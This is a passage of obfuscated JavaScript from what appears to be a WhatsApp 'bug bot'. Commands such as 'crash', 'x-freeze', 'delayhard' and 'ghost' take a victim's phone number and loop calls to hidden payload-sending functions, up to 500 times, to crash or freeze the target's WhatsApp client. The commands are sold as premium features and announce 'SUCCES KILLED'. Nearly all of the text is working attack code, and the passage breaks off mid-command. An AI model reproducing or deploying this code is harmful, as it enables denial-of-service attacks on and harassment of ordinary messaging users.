          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x1155c0 = 0x0; _0x1155c0 < 0x1f4; _0x1155c0++) {
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
          }
        }
        break;
      case "x-primis":
      case 'bughard':
      case "delayhard":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x55adfd = 0x0; _0x55adfd < 0x1f4; _0x55adfd++) {
            await _0x2fd6f1(target);
            await _0x2fd6f1(target);
            await _0x2fd6f1(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x2fd6f1(target);
            await _0x2fd6f1(target);
            await _0x2fd6f1(target);
            await _0x2fd6f1(target);
            await _0x29f67d(target);
            await _0x2fd6f1(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x576c5e(0x1f4);
          }
        }
        break;
      case 'ht-bug':
      case "pr-bug":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x237ee9 = 0x0; _0x237ee9 < 0xa; _0x237ee9++) {
            await _0x28a9fc(target, Ptcp = true);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
            await _0x4ba357(target, Ptcp = false);
            await _0x28a9fc(target, Ptcp = true);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
            await _0x4ba357(target, Ptcp = false);
            await _0x28a9fc(target, Ptcp = true);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
            await _0x28a9fc(target, Ptcp = true);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
            await _0x28a9fc(target, Ptcp = true);
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
            await _0x4ba357(target, Ptcp = false);
            await _0x28a9fc(target, Ptcp = true);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
            await _0x4ba357(target, Ptcp = false);
            await _0x28a9fc(target, Ptcp = true);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
            await _0x28a9fc(target, Ptcp = true);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
          }
        }
        break;
      case "zeph":
      case "jaxx":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x14c2e7 = 0x0; _0x14c2e7 < 0xa; _0x14c2e7++) {
            await _0x4331d9(target);
            await _0x46e130(target);
          }
        }
        break;
      case 'ghost':
      case "dead":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x20374b = 0x0; _0x20374b < 0xa; _0x20374b++) {
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x399639(target);
            await _0x399639(target);
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x29974a(target);
            await _0x29974a(target);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x399639(target);
            await _0x399639(target);
            await _0x29974a(target);
            await _0x29974a(target);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x399639(target);
            await _0x399639(target);
            await _0x29974a(target);
            await _0x29974a(target);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x399639(target);
            await _0x399639(target);
            await _0x29974a(target);
            await _0x29974a(target);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x399639(target);
            await _0x399639(target);
            await _0x29974a(target);
            await _0x29974a(target);
            await _0x21ee34(target, ptcp = false);
          }
        }
        break;
      case "crashprim":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x4664dc = 0x0; _0x4664dc < 0xa; _0x4664dc++) {
            await _0x52600c(target, Ptcp = false);
            await _0x162a6a(target);
            await _0x399639(target);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x21ee34(target, ptcp = false);
            await _0x21ee34(target, ptcp = false);
            await _0x3561c4(target, Ptcp = true);
            await _0x3def04(target);
            await _0x10574c(target);
            await _0xd2ecf2(target, Ptcp = false);
            await _0x1dbdcf(target);
            await _0x44bef6(target, ptcp = true);
            await _0x29974a(target);
            await _0x21ee34(target, ptcp = false);
          }
        }
        break;
      case "x-freeze":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x4cb6cd = 0x0; _0x4cb6cd < 0xa; _0x4cb6cd++) {
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x162a6a(target);
            await _0x52600c(target, Ptcp = false);
            await _0x21ee34(target, ptcp = false);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x399639(target);
            await _0xd2ecf2(target, Ptcp = false);
            await _0x3561c4(target, Ptcp = true);
            await _0x1dbdcf(target);
            await _0x44bef6(target, ptcp = true);
            await _0x29974a(target);
          }
        }
        break;
      case "bantai":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x5cd2cf = 0x0; _0x5cd2cf < 0xa; _0x5cd2cf++) {
            await _0x21ee34(target, ptcp = false);
            await _0x3561c4(target, Ptcp = true);
            await _0x21ee34(target, ptcp = false);
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x162a6a(target);
            await _0xd2ecf2(target, Ptcp = false);
            await _0x44bef6(target, ptcp = true);
            await _0x44bef6(target, ptcp = true);
            await _0x52600c(target, Ptcp = false);
            await _0x21ee34(target, ptcp = false);
          }
        }
        break;
      case "yandex":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x111c1a = 0x0; _0x111c1a < 0xa; _0x111c1a++) {
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x29974a(target);
            await _0x29974a(target);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x5c64a0(target, ptcp = true);
            await _0x5c64a0(target, ptcp = true);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x4131a6(target);
            await _0x4131a6(target);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x162a6a(target);
            await _0x52600c(target, Ptcp = false);
            await _0x21ee34(target, ptcp = false);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x399639(target);
            await _0xd2ecf2(target, Ptcp = false);
            await _0x162a6a(target);
            await _0xd2ecf2(target, Ptcp = false);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x162a6a(target);
            await _0x52600c(target, Ptcp = false);
            await _0x21ee34(target, ptcp = false);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x399639(target);
            await _0xd2ecf2(target, Ptcp = false);
            await _0x29974a(target);
            await _0x29974a(target);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x3def04(target);
            await _0x10574c(target);
          }
        }
        break;
      case "frostveil":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0xacf34e = 0x0; _0xacf34e < 0x64; _0xacf34e++) {
            await _0x448e29(_0x35a9de, target);
          }
        }
        break;
      case "emberstrike":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x525234 = 0x0; _0x525234 < 0x19; _0x525234++) {
            await _0x1247a5(target);
            await _0x448e29(_0x35a9de, target);
            await _0x1247a5(target);
            await _0x448e29(_0x35a9de, target);
          }
        }
        break;
      case 'ironclash':
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x3cbc09 = 0x0; _0x3cbc09 < 0x32; _0x3cbc09++) {
            await _0x448e29(_0x35a9de, target);
            await _0x448e29(_0x35a9de, target);
          }
        }
        break;
      case "voidspire":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x24c6bf = 0x0; _0x24c6bf < 0x5; _0x24c6bf++) {
            await _0x35420c(target);
          }
        }
        break;
      case "invis":
      case "delay":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x46bdf4 = 0x0; _0x46bdf4 < 0xa; _0x46bdf4++) {
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
          }
        }
        break;
      case "glitch":
      case "overload":
      case "phantom":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x25476b = 0x0; _0x25476b < 0xa; _0x25476b++) {
            await _0x2fd6f1(target);
            await _0x2fd6f1(target);
            await _0x2fd6f1(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x2fd6f1(target);
            await _0x2fd6f1(target);
            await _0x2fd6f1(target);
            await _0x2fd6f1(target);
            await _0x29f67d(target);
            await _0x2fd6f1(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x29f67d(target);
            await _0x576c5e(0x1f4);
          }
        }
        break;
      case '🦎':
      case '🐲':
      case '🦠':
      case '🎃':
      case '👽':
      case '👹':
      case '🐉':
      case '🐍':
      case '🐴':
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!_0x2f533f) {
            return _0x1fbef7("*ᴛʜɪs ғᴇᴀᴛᴜʀᴇ ᴏɴʟʏ sᴇɴᴅ ʙʏ ʙᴏᴛ ɴᴜᴍʙᴇʀ*");
          }
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0xb98b5 = 0x0; _0xb98b5 < 0xa; _0xb98b5++) {
            await _0x3def04(_0x51e776.chat);
            await _0x10574c(_0x51e776.chat);
            await _0x21ee34(_0x51e776.chat);
            await _0x29974a(_0x51e776.chat);
            await _0x29974a(_0x51e776.chat);
          }
          await _0x598ae1(0x3e8);
        }
        break;
      case "agus":
      case "yanto":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x49584e = 0x0; _0x49584e < 0xa; _0x49584e++) {
            await _0x28a9fc(target, Ptcp = true);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
            await _0x4ba357(target, Ptcp = false);
            await _0x28a9fc(target, Ptcp = true);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
            await _0x4ba357(target, Ptcp = false);
            await _0x28a9fc(target, Ptcp = true);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
            await _0x28a9fc(target, Ptcp = true);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
            await _0x28a9fc(target, Ptcp = true);
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
            await _0x4ba357(target, Ptcp = false);
            await _0x28a9fc(target, Ptcp = true);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
            await _0x4ba357(target, Ptcp = false);
            await _0x28a9fc(target, Ptcp = true);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
            await _0x28a9fc(target, Ptcp = true);
            await _0x28a9fc(target, Ptcp = true);
            await _0x4ba357(target, Ptcp = false);
          }
        }
        break;
      case "delay-combo":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x1986fe = 0x0; _0x1986fe < 0xa; _0x1986fe++) {
            await _0x75052a(isTarget, true);
            await _0x2849d6(target);
            await _0x2d3dfd(target);
            await _0x75052a(isTarget, true);
            await _0x2849d6(target);
            await _0x2d3dfd(target);
            await _0x576c5e(0x1f4);
          }
        }
        break;
      case 'luminark':
      case "stormveil":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x7914ea = 0x0; _0x7914ea < 0xa; _0x7914ea++) {
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x399639(target);
            await _0x399639(target);
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x29974a(target);
            await _0x29974a(target);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x399639(target);
            await _0x399639(target);
            await _0x29974a(target);
            await _0x29974a(target);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x399639(target);
            await _0x399639(target);
            await _0x29974a(target);
            await _0x29974a(target);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x399639(target);
            await _0x399639(target);
            await _0x29974a(target);
            await _0x29974a(target);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x399639(target);
            await _0x399639(target);
            await _0x29974a(target);
            await _0x29974a(target);
            await _0x21ee34(target, ptcp = false);
          }
        }
        break;
      case "off":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x4604d0 = 0x0; _0x4604d0 < 0xa; _0x4604d0++) {
            await _0x52600c(target, Ptcp = false);
            await _0x162a6a(target);
            await _0x399639(target);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x21ee34(target, ptcp = false);
            await _0x21ee34(target, ptcp = false);
            await _0x3561c4(target, Ptcp = true);
            await _0x3def04(target);
            await _0x10574c(target);
            await _0xd2ecf2(target, Ptcp = false);
            await _0x1dbdcf(target);
            await _0x44bef6(target, ptcp = true);
            await _0x29974a(target);
            await _0x21ee34(target, ptcp = false);
          }
        }
        break;
      case "x-crash":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x190bdb = 0x0; _0x190bdb < 0xa; _0x190bdb++) {
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x162a6a(target);
            await _0x52600c(target, Ptcp = false);
            await _0x21ee34(target, ptcp = false);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x399639(target);
            await _0xd2ecf2(target, Ptcp = false);
            await _0x3561c4(target, Ptcp = true);
            await _0x1dbdcf(target);
            await _0x44bef6(target, ptcp = true);
            await _0x29974a(target);
          }
        }
        break;
      case "crash":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x12a173 = 0x0; _0x12a173 < 0xa; _0x12a173++) {
            await _0x21ee34(target, ptcp = false);
